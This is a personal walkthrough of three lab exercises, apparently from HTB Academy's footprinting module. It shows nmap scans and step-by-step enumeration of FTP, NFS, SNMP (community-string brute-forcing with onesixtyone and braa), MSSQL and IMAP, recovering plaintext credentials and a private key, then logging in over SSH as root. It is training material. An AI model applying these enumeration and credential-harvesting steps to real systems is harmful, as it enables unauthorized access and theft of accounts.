### EASY

Enumerate the server carefully and find the flag.txt file. Submit the contents of this file as the answer

Credentials
```
ceil
```
```
qwer1234
```

**NMAP**
Scan used
```
nmap -sV -A -sC 10.129.91.129
```
```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-14 20:25 EST
Nmap scan report for 10.129.91.129
Host is up (0.017s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     ProFTPD
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
2121/tcp open  ftp     ProFTPD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.79 seconds
```

**FTP**

- There are two types of FTP servers: one running port 21, the other port 2121. 
- Use ceil's credentials to log into FTP port 2121
- Use 'ls -la' to reveal hidden files/directories

![[ftp_server_2121.png]]

- Download all files
```
wget -m --no-passive ftp://ceil:qwer1234@10.129.202.34:2121
```

- Change the permissions on the private key, giving it 700 access
```
sudo chmod 700 id_rsa
```

- I stored the path and key name as a variable for convenience, then ssh'd into the target
```
ceil_key="/home/dan/10.129.202.34:2121/.ssh/id_rsa"
```
```
ssh -i $ceil_key ceil@10.129.57.86
```

**Flag**
![[HTB-Academy/3-Footprinting/Host Based Enumeration/attachements/flag.png]]


### MEDIUM

**Username**
```
HTB
```

**IP**
```
10.129.202.41
```

**NMAP**
```
Nmap scan report for 10.129.202.41
Host is up (0.059s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-11-19T02:03:39+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WINMEDIUM
|   NetBIOS_Domain_Name: WINMEDIUM
|   NetBIOS_Computer_Name: WINMEDIUM
|   DNS_Domain_Name: WINMEDIUM
|   DNS_Computer_Name: WINMEDIUM
|   Product_Version: 10.0.17763
|_  System_Time: 2023-11-19T02:03:31+00:00
| ssl-cert: Subject: commonName=WINMEDIUM
| Not valid before: 2023-11-18T01:55:52
|_Not valid after:  2024-05-19T01:55:52
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-11-19T02:03:33
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```


**Display NFS Shares with NSE Script**
```
sudo nmap --script nfs* 10.129.218.218 -sV -p111,2049 
```

```
PORT     STATE SERVICE  VERSION
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
| nfs-statfs: 
|   Filesystem    1K-blocks   Used        Available   Use%  Maxfilesize  Maxlink
|_  /TechSupport  41312252.0  16918692.0  24393560.0  41%   16.0T        1023
| nfs-showmount: 
|_  /TechSupport 
| nfs-ls: Volume /TechSupport
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID         GID         SIZE   TIME                 FILENAME
| rwx------   4294967294  4294967294  65536  2021-11-11T00:09:49  .
| ??????????  ?           ?           ?      ?                    ..
| rwx------   4294967294  4294967294  0      2021-11-10T15:19:28  ticket4238791283649.txt
| rwx------   4294967294  4294967294  0      2021-11-10T15:19:28  ticket4238791283650.txt
| rwx------   4294967294  4294967294  0      2021-11-10T15:19:28  ticket4238791283651.txt
| rwx------   4294967294  4294967294  0      2021-11-10T15:19:28  ticket4238791283652.txt
| rwx------   4294967294  4294967294  0      2021-11-10T15:19:28  ticket4238791283653.txt
| rwx------   4294967294  4294967294  0      2021-11-10T15:19:28  ticket4238791283654.txt
| rwx------   4294967294  4294967294  0      2021-11-10T15:19:29  ticket4238791283655.txt
| rwx------   4294967294  4294967294  0      2021-11-10T15:19:29  ticket4238791283656.txt
|_
2049/tcp open  nlockmgr 1-4 (RPC #100021)
```

**Mount to TechSupport**
```
mkdir medium
```
```
sudo mount -t nfs 10.129.218.218:/ ./medium/ -o nolock
```

![[techsupport_mount_share.png]]

Although we get a permission denied error we discovered a username - *nobody*

**Viewing the Contents of the TechSupport share**

- Copy the name of the mounted share with the -r command
```
cp -r medium/ medium2
```

- Change dir ownership to your local user
```
sudo chown dan TechSupport
```

- Change file ownership to your local user
```
sudo chown dan ticket4238791283782.txt
```

- Scroll down and you will see the only ticket with a size greater than 0
![[techsupport_ticket.png]]

- View contents of the file
![[alex_credentials.png]]
**Alex Credentials**
```
alex
```
```
lol123!mD
```

In our first nmap scan we there was a web server available on port 3389. Let's RDP into this machine. Use remmina to RDP into the box.

#### HTB Credentials

Credentials can be found in C:\\Users\\alex\\devshare\\important.txt . They are pasted below

```
sa
```
```
87N1ns@slls83
```
![[sa_credentials.png]]

Run the Microsoft SQL Server Manager program as Administrator.

Expand Databases -> accounts -> Tables and right click dbo.decsacc and select 'Select Top 1000 rows'. This will display the values in the table. Search for the 'HTB' user. Or use the query below

SQL Query
```
SELECT * FROM accounts.dbo.devsacc where name='HTB'
```

```
HTB:lnch7ehrdn43i7AoqVPK4zWR
```

![[HTB_user.png]]

### HARD

**NMAP**
```
Nmap scan report for 10.129.133.214
Host is up (0.025s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
110/tcp open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: CAPA USER UIDL STLS PIPELINING AUTH-RESP-CODE TOP RESP-CODES SASL(PLAIN)
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
143/tcp open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: more SASL-IR LITERAL+ listed IMAP4rev1 have post-login OK capabilities Pre-login LOGIN-REFERRALS AUTH=PLAINA0001 STARTTLS IDLE ENABLE ID
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: SASL-IR LITERAL+ listed IMAP4rev1 more have OK post-login capabilities LOGIN-REFERRALS AUTH=PLAINA0001 Pre-login IDLE ENABLE ID
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
|_ssl-date: TLS randomness does not represent time
995/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: CAPA USER SASL(PLAIN) AUTH-RESP-CODE UIDL TOP PIPELINING RESP-CODES
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=NIXHARD
| Subject Alternative Name: DNS:NIXHARD
| Not valid before: 2021-11-10T01:30:25
|_Not valid after:  2031-11-08T01:30:25
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**UDP Scan**
```
sudo nmap -sV -sC -A -sU -p161,162 10.129.84.5


Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-22 17:20 EST
Nmap scan report for 10.129.84.5
Host is up (0.017s latency).

PORT    STATE  SERVICE  VERSION
161/udp open   snmp     net-snmp; net-snmp SNMPv3 server
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 5b99e75a10288b6100000000
|   snmpEngineBoots: 10
|_  snmpEngineTime: 2h16m39s
162/udp closed snmptrap
Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops

```


**Search for Community Strings**
```
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.84.5
```


Results from onesixtyone...community string named 'backup' to brute-force the individual OIDs and enumerate the information behind them
```
10.129.84.5 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
```

**snmpwalk: Query the OIDs with the community string name 'backup'** 
```
snmpwalk -v2c -c backup 10.129.84.5


iso.3.6.1.2.1.1.1.0 = STRING: "Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (242653) 0:40:26.53
iso.3.6.1.2.1.1.4.0 = STRING: "Admin <tech@inlanefreight.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "NIXHARD"
iso.3.6.1.2.1.1.6.0 = STRING: "Inlanefreight"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (24) 0:00:00.24
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (24) 0:00:00.24
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (24) 0:00:00.24
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (24) 0:00:00.24
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (24) 0:00:00.24
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (24) 0:00:00.24
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (24) 0:00:00.24
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (24) 0:00:00.24
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (24) 0:00:00.24
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (24) 0:00:00.24
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (24) 0:00:00.24
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (243624) 0:40:36.24
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E7 0B 16 14 2C 12 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.4.0-90-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro ipv6.disable=1 maybe-ubiquity
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 157
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.1.1.0 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
iso.3.6.1.2.1.25.1.7.1.2.1.4.6.66.65.67.75.85.80 = ""
iso.3.6.1.2.1.25.1.7.1.2.1.5.6.66.65.67.75.85.80 = INTEGER: 5
iso.3.6.1.2.1.25.1.7.1.2.1.6.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.7.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.2.1.20.6.66.65.67.75.85.80 = INTEGER: 4
iso.3.6.1.2.1.25.1.7.1.2.1.21.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.3.1.1.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
iso.3.6.1.2.1.25.1.7.1.3.1.2.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:
Authentication token manipulation error
chpasswd: (line 1, user tom) password not changed
Changing password for tom."
iso.3.6.1.2.1.25.1.7.1.3.1.3.6.66.65.67.75.85.80 = INTEGER: 4
iso.3.6.1.2.1.25.1.7.1.3.1.4.6.66.65.67.75.85.80 = INTEGER: 1
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.1 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.2 = STRING: "Authentication token manipulation error"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.3 = STRING: "chpasswd: (line 1, user tom) password not changed"
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = STRING: "Changing password for tom."
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = No more variables left in this MIB View (It is past the end of the MIB tree)

```


**Potential SSH Credentials**
The snmpwalk output shows what could possibly be a pair of credentials...tom NMds732Js2761. Let's try to SSH into the box with these
```
ssh tom@10.129.113.105 
```

Doesn't work, 'Permission denied'

**Use braa to brute force the OID and enumerate the info  behind them**
```
braa backup@10.129.113.105:.1.3.6.*

10.129.113.105:42ms:.0:Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
10.129.113.105:20ms:.0:.10
10.129.113.105:20ms:.0:57212
10.129.113.105:21ms:.0:Admin <tech@inlanefreight.htb>
10.129.113.105:21ms:.0:NIXHARD
10.129.113.105:20ms:.0:Inlanefreight
10.129.113.105:20ms:.0:72
10.129.113.105:20ms:.0:51
10.129.113.105:21ms:.1:.1
10.129.113.105:21ms:.2:.1
10.129.113.105:63ms:.3:.1
10.129.113.105:21ms:.4:.1
10.129.113.105:20ms:.5:.1
10.129.113.105:20ms:.6:.49
10.129.113.105:20ms:.7:.4
10.129.113.105:20ms:.8:.50
10.129.113.105:42ms:.9:.3
10.129.113.105:21ms:.10:.92
10.129.113.105:20ms:.1:The SNMP Management Architecture MIB.
10.129.113.105:20ms:.2:The MIB for Message Processing and Dispatching.
10.129.113.105:20ms:.3:The management information definitions for the SNMP User-based Security Model.
10.129.113.105:20ms:.4:The MIB module for SNMPv2 entities
10.129.113.105:21ms:.5:View-based Access Control Model for SNMP.
10.129.113.105:20ms:.6:The MIB module for managing TCP implementations
10.129.113.105:20ms:.7:The MIB module for managing IP and ICMP implementations
10.129.113.105:20ms:.8:The MIB module for managing UDP implementations
10.129.113.105:20ms:.9:The MIB modules for managing SNMP Notification, plus filtering.
10.129.113.105:21ms:.10:The MIB module for logging SNMP Notifications.
10.129.113.105:20ms:.1:51
10.129.113.105:20ms:.2:51
10.129.113.105:21ms:.3:51
10.129.113.105:43ms:.4:51
10.129.113.105:20ms:.5:51
10.129.113.105:20ms:.6:51
10.129.113.105:20ms:.7:51
10.129.113.105:21ms:.8:51
10.129.113.105:21ms:.9:51
10.129.113.105:20ms:.10:51
10.129.113.105:20ms:.0:58062
10.129.113.105:41ms:.0:�
                         
10.129.113.105:20ms:.0:393216
10.129.113.105:20ms:.0:BOOT_IMAGE=/vmlinuz-5.4.0-90-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro ipv6.disable=1 maybe-ubiquity

10.129.113.105:20ms:.0:0
10.129.113.105:43ms:.0:158
10.129.113.105:41ms:.0:0
10.129.113.105:22ms:.0:1
10.129.113.105:41ms:.80:/opt/tom-recovery.sh
10.129.113.105:42ms:.80:tom NMds732Js2761
10.129.113.105: Message cannot be decoded!
10.129.113.105: Message cannot be decoded!
10.129.113.105: Message cannot be decoded!

```

With the credentials found let's try logging in to the mail server via IMAPS and POP3

**Logging IMAPS via curl**
```
curl -k 'imaps://10.129.113.105' --user tom:NMds732Js2761 -v

*   Trying 10.129.113.105:993...
* Connected to 10.129.113.105 (10.129.113.105) port 993
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
* Server certificate:
*  subject: CN=NIXHARD
*  start date: Nov 10 01:30:25 2021 GMT
*  expire date: Nov  8 01:30:25 2031 GMT
*  issuer: CN=NIXHARD
*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* old SSL session ID is stale, removing
< * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] Dovecot (Ubuntu) ready.
> A001 CAPABILITY
< * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN
< A001 OK Pre-login capabilities listed, post-login capabilities have more.
> A002 AUTHENTICATE PLAIN AHRvbQBOTWRzNzMySnMyNzYx
< * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE
< A002 OK Logged in
> A003 LIST "" *
< * LIST (\HasNoChildren) "." Notes
* LIST (\HasNoChildren) "." Notes
< * LIST (\HasNoChildren) "." Meetings
* LIST (\HasNoChildren) "." Meetings
< * LIST (\HasNoChildren \UnMarked) "." Important
* LIST (\HasNoChildren \UnMarked) "." Important
< * LIST (\HasNoChildren) "." INBOX
* LIST (\HasNoChildren) "." INBOX
< A003 OK List completed (0.004 + 0.000 + 0.003 secs).
* Connection #0 to host 10.129.113.105 left intact
```

Here we can see the following inboxes:

- Notes
- Meetings
- Important
- INBOX

Using a for looped curl request to access the headers of the messages in the INBOX folder

```
for m in {1..5}; do
  echo $m
  curl "imap://10.129.202.20/INBOX;MAILINDEX=$m;SECTION=HEADER.FIELDS%20(SUBJECT%20FROM)" --user tom:NMds732Js2761
done
```
![[inbox_headers.png]]

The first message is from the Admin with the subject of "KEY". Let's try to access and/or download this message.

**Download the message in INBOX via curl**
```
curl -k 'imaps://10.129.202.20/INBOX;MAILINDEX=1' --user tom:NMds732Js2761
```

And we have the private key!!!
![[HTB-Academy/3-Footprinting/Host Based Enumeration/attachements/private_key.png]]

Since we have the private key, we can now SSH into the box with the root user

**SSH into the box**
```
ssh -i footprint_id_rsa root@10.129.202.20
```

**Find the HTB user's password**
```
cat users.sql | grep 'HTB'
```

![[htb_credentials.png]]
